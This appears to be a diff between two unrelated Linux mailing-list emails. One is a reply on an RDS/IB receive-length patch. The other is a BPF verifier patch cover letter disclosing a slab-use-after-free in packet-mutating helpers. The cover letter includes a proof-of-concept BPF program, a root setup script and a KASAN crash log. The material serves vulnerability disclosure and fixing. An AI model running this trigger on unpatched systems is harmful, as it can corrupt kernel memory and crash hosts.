@@ -1,162 +1,364 @@
-Received: from smtp.kernel.org (aws-us-west-2-korg-mail-alma10-1.taild15c8.ts.net [100.103.45.18])
-	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
+Received: from mail-pl1-f170.google.com (mail-pl1-f170.google.com [209.85.214.170])
+	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id F3021348C6D;
-	Sun, 18 Oct 2026 05:38:10 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=100.103.45.18
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id CB740352027
+	for <netdev@vger.kernel.org>; Sun, 18 Oct 2026 05:44:33 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.214.170
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1792301892; cv=none; b=CucdcSAf0f/vzCrArnhv4LDnE+lx+xzkl1qiB3KDbj2oRXsXgBc1EU6r0SueuMxZetTHcGRa7OIaqmkJGmlQuOhAcjr2BAcTlFrJ54WyiZsF01V283K+nLPg2j7n8gXdooIXkWW9F/P/o9iPBDYuRyR8C7KU3N0Cbg+PMNE7PU0=
+	t=1792302275; cv=none; b=mv+2EoTfvMac2dT2URc2wHnpfgKSP8FhlHHO0WDPP5ZlJzq9rpDSyvI1c+mliXwpZZySa4RzQBcH9mR6dDTBOKPGawk/jQZUbJeGGt4Kv00Kt3UNtDdJHnoAN2ECQ1gGkrsTmMc4qEHnuemETqTaFdtilFqkq+n3drljCuURipg=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1792301892; c=relaxed/simple;
-	bh=lpYfcbbp/dqOjzrL/y9t5SP6QJzos/hzcl6m09z3C0A=;
-	h=Message-ID:Subject:From:To:Cc:Date:In-Reply-To:References:
-	 Content-Type:MIME-Version; b=N59bn/rXky5JHcbOjIuR6kn+juD4cZO5JN4POC1f5vVMQNfxo1E2LXDPMPoZRxJD5KeIvZuN3WVZf0MzC/YwFignbQaYuognXqWojflY1Z+9aVEuAS8n3jgfqMM8P1azqIonn9mvPqQHGLv3wnFXWFjiL4xiTpnAx9U0PeIzBlM=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dkim=pass (2048-bit key) header.d=kernel.org header.i=@kernel.org header.b=VATH8ohg; arc=none smtp.client-ip=100.103.45.18
+	s=arc-20240116; t=1792302275; c=relaxed/simple;
+	bh=cghKMTBT5r0M+ecyi/4ofOEr4eHa4bOFNt5a7Nkyg+U=;
+	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=UFTzp2KEF8qHcGx8EGdNf8yK6BWnuIGpCl+tgm+emhGwQlMjqhNIF/W+OnXzezMNd/tmDGfy2V6rsrvjbvVs2f/R7yEWOrD/6DJuF5HlzKg3ABP2u95aKpOI5jCgzU/kN+VkBQog7uv3HJz1mx3oFI7KxAeWVPIn3jkeRxFJMjM=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=h8KAVFdH; arc=none smtp.client-ip=209.85.214.170
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=kernel.org header.i=@kernel.org header.b="VATH8ohg"
-Received: by smtp.kernel.org (Postfix) with ESMTPSA id 02E501F000C4;
-	Sun, 18 Oct 2026 05:38:09 +0000 (UTC)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=kernel.org;
-	s=k20260515; t=1792301890;
-	bh=Vtx062sMT267uR+1dahU2irvboi7cB2dSCiWZpp1Ywk=;
-	h=Subject:From:To:Cc:Date:In-Reply-To:References;
-	b=VATH8ohgIu8qqwvA8JX2vSZyjpWv2YecLAyICL7soR5e0gFRAGG5j86lrVfbu5Tje
-	 cKkxlezUn4iyYGUspZ81W8jUmha7yrX5g33HHIQBjSeqkf1pWsZuFWiicFHfgfOMmq
-	 yodAcsh/FCukeCXLlw+GJqY69YQrH+7CI3Yqr7z2soaE1erqokxS1A/okOgXTdZ9Eu
-	 EceqhVjW1Sd9FzslpDYJyH59BgHtSQrDSqWNfmM9qTkODQ9eYZbZlga6nN1BuX5N+X
-	 +tbelCAV04Be9Iwx+qeNKg3W4cLfPJ24RRC5ShsyOJPUAu5KNeYfEUJnQRWNy5aPJw
-	 sYxAyw/1vqTkQ==
-Message-ID: <f1504e3ae8da8789bcd6cd474ce51fec7dd15555.camel@kernel.org>
-Subject: Re: [rds-devel] [External] : Re: [PATCH net] RDS/IB: validate
- receive completion payload length
-From: Allison Henderson <achender@kernel.org>
-To: Gerd Rausch <gerd.rausch@oracle.com>, sungbyeongchan
- <tjdqudcks0424@naver.com>, "David S . Miller" <davem@davemloft.net>, Eric
- Dumazet <edumazet@kernel.org>, Jakub Kicinski <kuba@kernel.org>, Paolo
- Abeni <pabeni@redhat.com>,  Simon Horman <horms@kernel.org>, Andy Grover
- <andy.grover@oracle.com>
-Cc: netdev@vger.kernel.org, linux-rdma@vger.kernel.org, 
-	rds-devel@oss.oracle.com, linux-kernel@vger.kernel.org
-Date: Sat, 17 Oct 2026 22:38:09 -0700
-In-Reply-To: <7e69b862-7cad-443f-912b-ce2db7854d60@oracle.com>
-References: <20261006205204.1322102-1-tjdqudcks0424@naver.com>
-	 <c1efb25a93739dfe2c16828bbcdc9bd7535850c1.camel@kernel.org>
-	 <7e69b862-7cad-443f-912b-ce2db7854d60@oracle.com>
-Content-Type: text/plain; charset="UTF-8"
-Content-Transfer-Encoding: quoted-printable
-User-Agent: Evolution 3.52.3-0ubuntu1.1 
+	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="h8KAVFdH"
+Received: by mail-pl1-f170.google.com with SMTP id d9443c01a7336-2e985106c0cso7313985ad.2
+        for <netdev@vger.kernel.org>; Sat, 17 Oct 2026 22:44:33 -0700 (PDT)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=nebusec.ai; s=google; t=1792302273; x=1792907073; darn=vger.kernel.org;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
+        bh=XfX3fVvarhTrNhL23P2+nD+Pu0SSxWWv0jWAubdWzeE=;
+        b=h8KAVFdHQzOXqXcm0nkx2nCmG1r9U3AdJNJuaTUrTswDZOzombshF6iBd23Kuc9oa+
+         2DPgOAB8mFktwevYP87/fuTFQP/P/cZ+7C+/ItqUvwdFywCMgA+koe+egUELrRHFQB3+
+         E5VinROg0+kSdJEzAdk7Pohu0teaOMj3QslAXyVhvxFh8rh557/RLO0nHNNZcrUayAOx
+         JKf6I7dS4t5TU2Q6xepJfwVne6AQYaQT94NwmcjOssQvtYXbL7FyTmwvNjhGHnH4Qpyx
+         ETHq0QXnNLXWUTieXwD62WSoiwpPDt9+7TEk4gIwmx87theLbTV+bs5lijrBtrLvcuoi
+         xD2Q==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20260707; t=1792302273; x=1792907073;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
+         :message-id:reply-to:content-type;
+        bh=XfX3fVvarhTrNhL23P2+nD+Pu0SSxWWv0jWAubdWzeE=;
+        b=1gYTn//P34UZS8a3+IJA4g2Uik+KHK3sgob2wN52aYtesVUi9UBOT6oVIA6aeC0n+N
+         hwMXtTut4EVxhL3buMphlcaLo5AtP7+v4V2B+8rSimQ8lcGmIH3C1VTptVgS07QyRkPR
+         SSnA/7RC999nW+YAbZSGSCcVImlQKM1JxQrpfmjj5FNYHvbm0IR+a1hlkIv8+42fKQGe
+         TBsAM5onFk//YTejlg2uui31AGSx0qZWAkpo4rXHRHkbomjSzO4sdvj9l73phgMzmLLu
+         GJQP/Ty8E3xlbEy/J0PaCRNZ46chsGUNaWCOgykUTCb3Ni/wH1LTAVE1AFrR7KYyBVMR
+         BP9A==
+X-Forwarded-Encrypted: i=1; AKwUvByaP8EcIsY3kJ46gDygbnb6kakHPFbI25QsV6zvZKuiMd68erKphUrF2nJ92hQAU20EADRmJGU=@vger.kernel.org
+X-Gm-Message-State: AFq9FYK9Qp5PLRufok5D2DW3Z6irrlkLGdQbdwIsqgTmOi/hL/6F1DED
+	tGm98LljnO3iLTsPtQZiwiR6ZMp1xViZIOBiSQN3JwdXfX9Mgcy07vc6+SKg7Sc/HWPe
+X-Gm-Gg: AYBFou3wTR0OfUQJfagVIVYQaMeOKqrHFhKWwr8qS6bGoyf3Fu5KOhRCn3joN42LRAX
+	RLZ6GaUeH17udLuc61YkZ5PzTvJ0qoi25+TRkXOaF4Lti5Gd+tB1DepCvIos1dkD5rkJ9/IFCpn
+	8CrqswgTaMrQk8I7EUwjMbYdsmBwW1tUBCow5v+/VRQ5XD/rvu9gZb9uwil5qsxfZH0rAhHZA+y
+	YBICmTCJKuadj5s7WvUqZmvVl7+A6ev99xw7oWqPSm9drcmvchVj1fJrRIf3JcXBhqdJbGpCmT3
+	HdWdavXC2j2qH1YJPG7yQveNa+X5xyXl6hTkWm8Y7xZMXPV+Wnb5NPc/wT4fpVEfnydY+Gwcn5H
+	fWwqv6PV8OpoR2ZdQI+hkChh3YmF01M39da/ioA8wrLzv/Qk5A2Qr/3oqMG18PGOR5AXFaQo0pw
+	yBeGxmJpY9i5xRhBXCssc2sxlg96+yo+36fxVQXPICTnQ6DnuD+sO4WZVo/i2x9Pq+lY+fBXHf8
+	cdd9ifB38c=
+X-Received: by 2002:a17:903:1111:b0:2e9:4f7b:affd with SMTP id d9443c01a7336-2e9a6846609mr38166935ad.6.1792302272926;
+        Sat, 17 Oct 2026 22:44:32 -0700 (PDT)
+Received: from enjou-Legion-Y7000P-2019 ([219.141.235.82])
+        by smtp.gmail.com with ESMTPSA id d9443c01a7336-2e97e804e80sm27011525ad.23.2026.10.17.22.44.25
+        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
+        Sat, 17 Oct 2026 22:44:32 -0700 (PDT)
+From: Ren Wei <weir@nebusec.ai>
+To: bpf@vger.kernel.org,
+	netdev@vger.kernel.org,
+	ast@kernel.org
+Cc: daniel@iogearbox.net,
+	andrii@kernel.org,
+	eddyz87@gmail.com,
+	memxor@gmail.com,
+	martin.lau@linux.dev,
+	song@kernel.org,
+	yonghong.song@linux.dev,
+	jolsa@kernel.org,
+	emil@etsalapatis.com,
+	ihor.solodrai@linux.dev,
+	john.fastabend@gmail.com,
+	davem@davemloft.net,
+	kuba@kernel.org,
+	hawk@kernel.org,
+	sdf@fomichev.me,
+	drosen@google.com,
+	ameryhung@gmail.com,
+	xyx2021@mail.ustc.edu.cn,
+	chenyy23@mails.tsinghua.edu.cn,
+	vega@nebusec.ai,
+	rakukuip@gmail.com,
+	weir@nebusec.ai
+Subject: [PATCH bpf-next v2 0/2] bpf: Reject packet dynptr slices in mutating helpers and subprograms
+Date: Sun, 18 Oct 2026 13:44:20 +0800
+Message-ID: <cover.1792222148.git.rakukuip@gmail.com>
+X-Mailer: git-send-email 2.53.0
 Precedence: bulk
 X-Mailing-List: netdev@vger.kernel.org
 List-Id: <netdev.vger.kernel.org>
 List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
+Content-Transfer-Encoding: 8bit
 
-On Fri, 2026-10-16 at 13:18 -0700, Gerd Rausch wrote:
-> Hi,
->=20
-> On 2026-10-06 18:13, Allison Henderson via rds-devel wrote:
-> > > --- a/net/rds/ib_recv.c
-> > > +++ b/net/rds/ib_recv.c
-> > > @@ -949,6 +949,15 @@ static void rds_ib_process_recv(struct rds_conne=
-ction *conn,
-> > >  		}
-> > >  	}
-> > > =20
-> > > +	if (data_len !=3D min_t(u32, ic->i_recv_data_rem, RDS_FRAG_SIZE)) {
-> > > +		rds_ib_conn_error(conn,
-> > > +				  "incoming fragment payload length %u, expected %u; "
-> > > +				  "disconnecting and reconnecting\n",
-> > > +				  data_len,
-> > > +				  min_t(u32, ic->i_recv_data_rem, RDS_FRAG_SIZE));
-> > > +		goto done;
-> > > +	}
-> > > +
-> > >  	list_add_tail(&recv->r_frag->f_item, &ibinc->ii_frags);
-> > >  	recv->r_frag =3D NULL;
-> > > =20
-> How does forcing a reconnect help this situation?
->=20
-> After the reconnect, the sender submits the exact same (incorrect) messag=
-e again,
-> which it kept in "cp_retrans".
->=20
-> Therefore, the exact same conditional triggers again.
->=20
-> All but the last fragment of an RDS/IB message are expected to be of RDS_=
-FRAG_SIZE.
->=20
-> While there's no good protocol specification (to the best of my knowledge=
-),
-> posting an insufficiently large message can be seen as protocol violation=
-.
->=20
+From: Luxiao Xu <rakukuip@gmail.com>
 
-Hi Gerd,
+Hi Linux kernel maintainers,
 
-First, some bookkeeping to catch up with: this patch was submitted
-slightly after Shubham's "RDS/IB: validate receive fragment completions",
-which effectively the same patch.  Shubham's variant went through a few
-revisions on netdev and is now in the net tree as 65cf6863606b.  It
-varies only slightly, so your questions still apply, but to a different
-patch and one that's already merged:
+We found and validated a slab-use-after-free issue in the BPF verifier
+(kernel/bpf/verifier.c) affecting packet-mutating helpers and
+subprograms.
 
-https://lore.kernel.org/netdev/20261013025729.40815-1-shubham@octane.securi=
-ty/
+Impact Scope:
+When an skb-backed dynptr slice (PTR_TO_MEM tagged with
+DYNPTR_TYPE_SKB, DYNPTR_TYPE_XDP, or DYNPTR_TYPE_SKB_META) is passed
+to helpers or subprograms that mutate packet data (e.g.
+bpf_lwt_push_encap(), bpf_skb_store_bytes(), or bpf_dynptr_write()
+into an skb dynptr), reallocation of the packet buffer via
+skb_cow_head() or pskb_expand_head() frees the old head and
+invalidates the slice during helper execution, leading to a
+slab-use-after-free read or write.
 
-On the retransmit loop: cp_retrans only matters if the sender is our
-own RDS stack, and our stack can't produce the fragment this check
-rejects.  rds_ib_xmit() posts every fragment but the last at
-RDS_FRAG_SIZE, because the scatterlist entries it works from are full
-pages except the final one.  It even BUG_ONs if it's ever asked to
-resume a message at an offset that isn't a multiple of RDS_FRAG_SIZE,
-which can only hold if everything sent so far went out in full
-fragments.
- =20
-MSG_ZEROCOPY is the only path that produces odd-sized entries, and
-rds_sendmsg() refuses it for anything but TCP.  So a Linux peer never
-trips this, before or after a reconnect.  The peer that does trip it
-is already off the protocol, as you say, and whatever it retransmits
-isn't governed by our cp_retrans.
+Privilege Requirements:
+Triggering this bug requires root privileges (UID 0 / CAP_NET_ADMIN
+and CAP_BPF) to load BPF LWT programs, configure network dummy
+devices, attach LWT encap routes, and adjust sysctl parameters. The
+reproducer script and crash log reflect this privileged execution
+context.
 
-> Therefore, apart from security concerns, the previous behavior of garbage=
--in / garbage-out
-> is IMO better than this behavior of just endlessly forcing a reconnect.
+Testing & Validation Results:
+The slab-use-after-free was reproduced on unpatched kernels using the
+enclosed LWT reproducer, triggering a KASAN slab-use-after-free crash
+under UID 0. With this v2 patch series applied, the verifier rejects
+loading such programs at program load time with -EINVAL, preventing
+the crash. We also verified compilation and ran negative verifier
+selftests, all passing with zero regressions.
 
-The trouble is that the garbage going out wasn't the sender's.  The
-receiver delivered h_len bytes of a page that only had data_len bytes
-written into it, so the tail was whatever the page held before: an
-earlier message to another socket (the report demonstrated this across
-UIDs), or unzeroed memory on a fresh page.  That's the bug. And
-refusing to deliver it is the whole fix.
+This bug is tracked at: https://bugtracker.nebusec.ai/f/11304
+Closes: https://bugtracker.nebusec.ai/f/11304
 
-Dropping the connection is also what rds_ib_process_recv() has always
-done for the neighbouring case, a fragment whose header doesn't match
-the message in progress.  That check has been there since 1e23b3ee0e94
-and has the same "a misbehaving peer can keep us reconnecting"
-property.  This patch doesn't add a new failure mode, it just closes
-the one way a malformed fragment could still get through.
->=20
+In v1, we proposed a local workaround in net/core/lwt_bpf.c to buffer the
+encap header across skb_cow_head(). As Alexei Starovoitov pointed out,
+patching lwt_bpf.c alone only treats a symptom; any helper mutating
+packet data (e.g. BPF_LWT_ENCAP_SEG6, bpf_skb_store_bytes(), or
+bpf_dynptr_write() into an skb dynptr) suffers from the exact same
+use-after-free read or write when the skb head buffer is reallocated.
 
-> If there's a strong desire to address this issue, the sender should be
-> told to discard the message. A reconnect doesn't address this issue.
->=20
-I don't think there's a way to say that today.  The RDS header flags are
-congestion-bitmap, ack-required, retransmitted and the extension-header
-bit.  The only error a receiver can signal to its peer is to drop the
-connection.
+The architectural root cause is that the verifier rejects raw packet
+pointers (PTR_TO_PACKET) for mutating helpers because they do not have
+pkt_access, but allows an skb-backed dynptr slice (PTR_TO_MEM tagged with
+DYNPTR_TYPE_SKB, DYNPTR_TYPE_XDP, or DYNPTR_TYPE_SKB_META) through
+check_helper_mem_access() ever since commit 2012c867c800 ("bpf:
+verifier: Accept dynptr mem as mem in helpers") stripped
+DYNPTR_TYPE_FLAG_MASK for ARG_PTR_TO_MEM.
 
-A per-message reject would be a protocol extension that both ends have to
-implement.  But that would be net-next material, and it couldn't help
-against the only peers that actually send these.  I'd be happy to review it
-if someone wants to take it on, but I don't think it should hold up a stabl=
-e
-fix for a data disclosure.
+This series resolves the problem across mutating helpers and subprograms:
+- Patch 1 rejects reg_is_dynptr_slice_pkt() arguments for helpers that
+  change packet data in check_func_arg() (mirroring commit a6c1edfbe240
+  ("bpf: Reject pkt arguments in mutating subprogs") for global
+  subprograms). In addition, it models bpf_dynptr_copy and
+  bpf_dynptr_memset as packet-changing when targeting skb dynptrs,
+  marks subprograms invoking them as changes_pkt_data during CFG
+  analysis, rejects passing packet dynptrs to mutating subprograms,
+  provides a stack fallback for non-linear skb dynptr copies, and
+  updates test_xdp_meta.c.
+- Patch 2 adds dedicated negative tests in dynptr_fail.c.
 
-Hope that helps!
-Allison
+Note on CFG and subprog semantics: CFG analysis conservatively marks a
+subprogram that invokes bpf_dynptr_write (or a packet-changing dynptr
+kfunc) as changes_pkt_data, without inspecting the dynptr's runtime
+type. This is required because CFG analysis runs before do_check() and
+has no register or stack state to reason about, and because a global
+subprogram's dynptr parameter type-erases to BPF_DYNPTR_TYPE_LOCAL
+during its isolated verification. This safe over-approximation is what
+prevents an skb dynptr from reaching a subprogram that could reallocate
+skb->head. The cost is that a caller holding a direct packet pointer
+across such a subprogram call must re-read ctx->data/ctx->data_end
+afterwards, which is the standard BPF verifier re-validation
+requirement. We prefer soundness over completeness here, matching the
+conservative CFG marking used by commit a6c1edfbe240 ("bpf: Reject pkt
+arguments in mutating subprogs"). This is a verification-time
+restriction only; runtime behavior of accepted programs is unchanged.
 
-> Thanks,
->=20
->    Gerd
->=20
+v1 -> v2:
+- v1 Link:
+  https://lore.kernel.org/all/cover.1791433504.git.rakukuip@gmail.com/
+- Retarget series to bpf-next tree instead of net (Alexei Starovoitov).
+- Fix root cause in BPF verifier by rejecting reg_is_dynptr_slice_pkt()
+  arguments in check_func_arg() for helpers changing packet data instead
+  of patching individual helpers (Alexei Starovoitov).
+- Correct Fixes tag to commit 2012c867c800 ("bpf: verifier: Accept dynptr
+  mem as mem in helpers") which first accepted dynptr slices as helper
+  arguments (Alexei Starovoitov).
+- Model bpf_dynptr_copy and bpf_dynptr_memset as packet-changing in
+  bpf_is_kfunc_pkt_changing() and CFG analysis when writing to skb
+  dynptrs, ensuring clear_all_pkt_pointers() clears packet slices.
+- Reject passing packet dynptrs to subprograms that may change packet
+  data in check_func_arg(), preventing global subprograms from mutating
+  skb dynptrs.
+- In bpf_dynptr_copy(), fall back to safe chunked copying through a
+  stack buffer when writing to non-linear skb dynptrs.
+- Update ing_cls_dynptr_write() in test_xdp_meta.c to use a stack buffer
+  (Alexei Starovoitov).
+- Add dedicated negative tests in dynptr_fail.c (Alexei Starovoitov).
+
+=== details and PoC below ===
+
+Bug details:
+
+The BPF verifier permits an skb-backed bpf_dynptr_slice() pointer to
+satisfy the helper's ARG_PTR_TO_MEM | MEM_RDONLY header argument.
+
+In bpf_lwt_push_ip_encap(), skb_cow_head() is called to expand headroom.
+If the skb headroom is insufficient or the skb is cloned,
+skb_cow_head() invokes pskb_expand_head(), which allocates a new head
+buffer and frees the old one. If the encapsulation header pointer hdr
+points into the skb head, it becomes stale after reallocation.
+Subsequent reads of iph and hdr in skb_postpush_rcsum(), UDP tunnel
+header handling, and memcpy() lead to a use-after-free read.
+
+The same issue affects BPF_LWT_ENCAP_SEG6 mode, bpf_skb_store_bytes()
+when offset is in frags, bpf_dynptr_write() into skb dynptrs, and the
+rest of seg6 helpers.
+
+Reproducer:
+
+The reproducer requires root privileges (UID 0 / CAP_NET_ADMIN and
+CAP_BPF) and executes in a root shell. It attaches an LWT_XMIT BPF program
+to an IPv4 route via "encap bpf xmit". The BPF program obtains an
+skb-backed dynptr slice and calls bpf_lwt_push_encap(skb,
+BPF_LWT_ENCAP_IP, hdr, 256). A subsequent packet transmission triggers
+skb_cow_head() reallocation, resulting in the KASAN slab-use-after-free
+under UID 0 shown in the crash log below.
+
+=== BEGIN poc.bpf.c ===
+    // SPDX-License-Identifier: GPL-2.0
+    #include <linux/bpf.h>
+    #include <linux/ip.h>
+
+    #define HDR_LEN 256
+
+    #define SEC(name) __attribute__((section(name), used))
+    #define __ksym __attribute__((section(".ksyms")))
+    #define __weak __attribute__((weak))
+
+    extern int bpf_dynptr_from_skb(struct __sk_buff *skb, __u64 flags,
+    			       struct bpf_dynptr *ptr__uninit) __ksym __weak;
+    extern void *bpf_dynptr_slice(const struct bpf_dynptr *ptr,
+				  __u32 offset, void *buffer,
+				  __u32 buffer__szk) __ksym __weak;
+
+    static long (*bpf_lwt_push_encap)(struct __sk_buff *skb, __u32 type,
+    				  void *hdr, __u32 len) =
+    	(void *)BPF_FUNC_lwt_push_encap;
+
+    SEC("lwt_xmit")
+    int trigger(struct __sk_buff *skb)
+    {
+    	struct bpf_dynptr ptr;
+    	void *hdr;
+
+    	if (bpf_dynptr_from_skb(skb, 0, &ptr))
+    		return BPF_OK;
+
+    	if (skb->len < HDR_LEN)
+    		return BPF_OK;
+
+    	hdr = bpf_dynptr_slice(&ptr, 0, NULL, HDR_LEN);
+    	if (!hdr)
+    		return BPF_OK;
+
+    	bpf_lwt_push_encap(skb, BPF_LWT_ENCAP_IP, hdr, HDR_LEN);
+    	return BPF_OK;
+    }
+
+    char _license[] SEC("license") = "GPL";
+=== END poc.bpf.c ===
+
+=== BEGIN poc.sh ===
+    #!/bin/sh
+    set -eu
+
+    DIR=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
+    ROUTE_CIDR=${ROUTE_CIDR:-10.0.0.0/24}
+    SRC_IP=${SRC_IP:-10.0.0.1}
+    DST_IP=${DST_IP:-10.0.0.2}
+    PING_SIZE=${PING_SIZE:-400}
+    PING_COUNT=${PING_COUNT:-10}
+    DEV=${DEV:-dummy0}
+
+    cleanup() {
+    	ip route del "$ROUTE_CIDR" 2>/dev/null || true
+    	ip link del "$DEV" 2>/dev/null || true
+    	ip addr del "$SRC_IP/32" dev lo 2>/dev/null || true
+    }
+
+    trap cleanup EXIT
+
+    echo 0 > /proc/sys/kernel/panic_on_warn
+
+    ip route del "$ROUTE_CIDR" 2>/dev/null || true
+    ip link del "$DEV" 2>/dev/null || true
+    ip addr del "$SRC_IP/32" dev lo 2>/dev/null || true
+
+    ip link add "$DEV" type dummy
+    ip link set lo up
+    ip addr add "$SRC_IP/32" dev lo
+    ip link set "$DEV" up
+    ip route add "$ROUTE_CIDR" dev "$DEV" \
+        encap bpf xmit obj "$DIR/poc.bpf.o" sec lwt_xmit
+
+    i=1
+    while [ "$i" -le "$PING_COUNT" ]; do
+    	ping -c 1 -W 1 -s "$PING_SIZE" -I "$SRC_IP" "$DST_IP" \
+    		>/dev/null 2>&1 || true
+    	i=$((i + 1))
+    done
+=== END poc.sh ===
+
+=== BEGIN crash log ===
+    BUG: KASAN: slab-use-after-free in bpf_lwt_push_ip_encap+0x805/0x1ac0
+    Read of size 256 at addr ffff88810c74e410 by task ping/10729
+    CPU: 3 UID: 0 PID: 10729 Comm: ping Not tainted 6.12.95 #2
+    Hardware name: QEMU Ubuntu 24.04 PC v2, BIOS 1.16.3-debian-1.16.3-2 04/01/2014
+    Call Trace:
+     <TASK>
+     dump_stack_lvl+0x78/0xe0
+     print_report+0xc6/0x620
+     ? bpf_lwt_push_ip_encap+0x805/0x1ac0
+     ? srso_alias_return_thunk+0x5/0xfbef5
+     ? __virt_addr_valid+0x1f3/0x3d0
+     ? bpf_lwt_push_ip_encap+0x805/0x1ac0
+     kasan_report+0xd8/0x110
+     ? bpf_lwt_push_ip_encap+0x805/0x1ac0
+     kasan_check_range+0xf4/0x1a0
+     __asan_memcpy+0x23/0x60
+     bpf_lwt_push_ip_encap+0x805/0x1ac0
+     ? srso_alias_return_thunk+0x5/0xfbef5
+     bpf_lwt_xmit_push_encap+0x2b/0x40
+     bpf_prog_62cb242b810c4a7f_trigger+0x6b/0x74
+     run_lwt_bpf.isra.0+0x32f/0x8c0
+     ? lwtunnel_xmit+0x102/0x4e0
+     bpf_xmit+0x139/0x380
+     lwtunnel_xmit+0x1f7/0x4e0
+     ip_finish_output2+0x8be/0x1eb0
+     ip_output+0x171/0x3b0
+     ip_push_pending_frames+0x1e6/0x250
+     ping_v4_sendmsg+0x719/0x16e0
+     __sys_sendto+0x32e/0x3a0
+     __x64_sys_sendto+0xe0/0x1c0
+     do_syscall_64+0xc7/0x270
+     entry_SYSCALL_64_after_hwframe+0x77/0x7f
+     </TASK>
+=== END crash log ===
+
+Luxiao Xu (2):
+  bpf: Reject packet dynptr slices in mutating helpers and subprograms
+  selftests/bpf: Test rejection of packet dynptr slices in mutating
+    helpers
+
+ include/linux/bpf_verifier.h                  |  1 +
+ kernel/bpf/cfg.c                              |  3 +-
+ kernel/bpf/helpers.c                          |  7 +-
+ kernel/bpf/verifier.c                         | 81 ++++++++++++++---
+ .../testing/selftests/bpf/progs/dynptr_fail.c | 90 +++++++++++++++++++
+ .../selftests/bpf/progs/test_xdp_meta.c       |  4 +-
+ 6 files changed, 170 insertions(+), 16 deletions(-)
+
+-- 
+2.43.0
+
